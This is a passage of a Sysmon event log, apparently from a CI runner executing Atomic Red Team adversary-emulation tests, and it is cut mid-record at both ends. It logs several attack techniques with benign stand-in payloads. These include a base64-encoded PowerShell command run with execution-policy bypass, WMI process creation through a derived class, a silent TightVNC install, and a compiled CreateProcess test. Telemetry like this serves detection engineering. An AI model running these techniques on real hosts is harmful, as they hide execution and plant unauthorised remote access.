ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:21.992
ProcessGuid: {f995aebf-6225-6942-0004-000000000e00}
ProcessId: 1928
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:21.847
ProcessGuid: {f995aebf-6225-6942-fe03-000000000e00}
ProcessId: 2736
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:21.845
ProcessGuid: {f995aebf-6225-6942-ff03-000000000e00}
ProcessId: 5408
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:21.777
ProcessGuid: {f995aebf-6225-6942-fd03-000000000e00}
ProcessId: 9060
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: /c calc.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-6225-6942-fc03-000000000e00}
ParentProcessId: 9752
ParentImage: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
ParentCommandLine: C:\Users\RUNNER~1\AppData\Local\Temp/T1106.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:21.775
ProcessGuid: {f995aebf-6225-6942-fc03-000000000e00}
ProcessId: 9752
Image: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA256=24FCAF2398115D6946E93739FCEB11B07D5D31C6B906B4F42A8037A5DB473D85
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:21.750
ProcessGuid: {f995aebf-6225-6942-fc03-000000000e00}
ProcessId: 9752
Image: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
FileVersion: 0.0.0.0
Description:  
Product: -
Company: -
OriginalFileName: T1106.exe
Hashes: SHA256=86A8ADA0B23827858424BC4B629038631E542E4E1483301BB91F347E90E1B39F
Signed: false
Signature: -
SignatureStatus: Unavailable
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:21.761
ProcessGuid: {f995aebf-6225-6942-fc03-000000000e00}
ProcessId: 9752
Image: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=8AA62B9BE054D79B6575BEF1DCEDCB2A707741E0245EC876AF4FA0DAB71594FF
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:21 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:21.745
ProcessGuid: {f995aebf-6225-6942-fc03-000000000e00}
ProcessId: 9752
Image: C:\Users\RUNNER~1\AppData\Local\Temp\T1106.exe
FileVersion: 0.0.0.0
Description:  
Product: -
Company: -
OriginalFileName: T1106.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp/T1106.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=86A8ADA0B23827858424BC4B629038631E542E4E1483301BB91F347E90E1B39F
ParentProcessGuid: {f995aebf-6224-6942-f803-000000000e00}
ParentProcessId: 5956
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""%tmp%\T1106.exe"" /target:exe ""C:\AtomicRedTeam\atomics\T1106\src\CreateProcess.cs"" & %tmp%/T1106.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:20 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:20.642
ProcessGuid: {f995aebf-6224-6942-fa03-000000000e00}
ProcessId: 4320
Image: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=3E10AA220D63BF5A29D7CA8423856D8993D469D9D74382309205505AEADFD0F8
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:20 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:20.345
ProcessGuid: {f995aebf-6224-6942-f703-000000000e00}
ProcessId: 8400
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:20 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:20.326
ProcessGuid: {f995aebf-6224-6942-f603-000000000e00}
ProcessId: 2132
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:19.755
ProcessGuid: {f995aebf-6223-6942-f503-000000000e00}
ProcessId: 8172
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.26100.5074 (WinBuild.160101.0800)
Description: Windows? installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: C:\Windows\system32\msiexec.exe /V
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-59d8-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=677417BA3AD87F73CD95AD30423998C6089E7EEF381B309A562CDA1EB6FE178E
ParentProcessGuid: {f995aebf-59d7-6942-0c00-000000000e00}
ParentProcessId: 980
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:19.657
ProcessGuid: {f995aebf-6223-6942-f403-000000000e00}
ProcessId: 5824
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.26100.5074 (WinBuild.160101.0800)
Description: Windows? installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: msiexec  /i ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=677417BA3AD87F73CD95AD30423998C6089E7EEF381B309A562CDA1EB6FE178E
ParentProcessGuid: {f995aebf-6223-6942-f203-000000000e00}
ParentProcessId: 1372
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c msiexec /i ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:19 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:19.635
ProcessGuid: {f995aebf-6223-6942-f203-000000000e00}
ProcessId: 1372
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c msiexec /i ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\tightvncinstaller.msi"" /qn /norestart
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:19 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:19.422
ProcessGuid: {f995aebf-6223-6942-f103-000000000e00}
ProcessId: 7764
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:19 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:56:19.404
ProcessGuid: {f995aebf-6223-6942-f103-000000000e00}
ProcessId: 7764
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:18 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:18.949
ProcessGuid: {f995aebf-6222-6942-ed03-000000000e00}
ProcessId: 2860
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f5khqgjt.dxe.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:17.192
ProcessGuid: {f995aebf-6221-6942-de03-000000000e00}
ProcessId: 7484
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:17.174
ProcessGuid: {f995aebf-6221-6942-dd03-000000000e00}
ProcessId: 2940
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:12.965
ProcessGuid: {f995aebf-621c-6942-d703-000000000e00}
ProcessId: 1344
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: WMI Provider Host
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Wmiprvse.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-59d8-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=240C985EED57DEE92E0415F86CE67439E24179EA3281D57A395A90E92F6844D5
ParentProcessGuid: {f995aebf-59d8-6942-0e00-000000000e00}
ParentProcessId: 696
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch -p
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:56:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:12.713
ProcessGuid: {f995aebf-621c-6942-d503-000000000e00}
ProcessId: 8328
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_z14yp4zy.zaj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:12.614
ProcessGuid: {f995aebf-621c-6942-d503-000000000e00}
ProcessId: 8328
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath(\""""Win32_Process\""""))
$NewClass = $Class.Derive(\""""Win32_Atomic\"""")
$NewClass.Put()
Invoke-WmiMethod -Path Win32_Atomic -Name create -ArgumentList notepad.exe}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:12.123
ProcessGuid: {f995aebf-621c-6942-d303-000000000e00}
ProcessId: 2080
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xvf43q4t.32z.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:12.042
ProcessGuid: {f995aebf-621c-6942-d303-000000000e00}
ProcessId: 2080
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell  -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-621c-6942-d103-000000000e00}
ParentProcessId: 7692
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:12.019
ProcessGuid: {f995aebf-621c-6942-d103-000000000e00}
ProcessId: 7692
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:10.309
ProcessGuid: {f995aebf-621a-6942-c403-000000000e00}
ProcessId: 7700
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:10.291
ProcessGuid: {f995aebf-621a-6942-c303-000000000e00}
ProcessId: 5936
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:56:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:09.815
ProcessGuid: {f995aebf-6219-6942-c103-000000000e00}
ProcessId: 928
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\AtomicTest.vbs
Hashes: SHA256=BB337E6815706D2F4BEDD5E2EE946C5177A6E0C7F50A3CC5F1CFE1B578975681
IsExecutable: false
Archived: true"
"12/17/2025 7:56:09 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:09.195
ProcessGuid: {f995aebf-6219-6942-bb03-000000000e00}
ProcessId: 2008
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hii4xj3c.r5w.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:56:08.311
ProcessGuid: {f995aebf-6218-6942-b503-000000000e00}
ProcessId: 5244
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rhzd3mxc.kc1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:56:08 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:56:08.032
ProcessGuid: {f995aebf-6218-6942-b403-000000000e00}
ProcessId: 4128
